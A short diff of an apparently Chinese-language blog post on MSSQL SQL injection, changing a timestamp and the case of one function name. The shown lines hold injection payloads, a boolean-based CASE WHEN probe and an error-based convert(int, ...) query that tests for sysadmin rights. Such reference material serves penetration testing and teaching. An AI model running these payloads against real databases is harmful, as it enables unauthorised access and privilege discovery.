@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2018-09-04 10:45:01
- * @LastEditTime: 2019-06-20 22:10:16
+ * @LastEditTime: 2019-06-20 22:12:54
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -55,7 +55,7 @@ select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);
 * 判断是否为sa权限
 
 ```
-select name from msg where id=1 and 1=convert(int,(select IS_SRVROLEMEMBER('sysadmin')));
+select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));
 ```
 
 ![55](/img/post/20180904-105516.png)
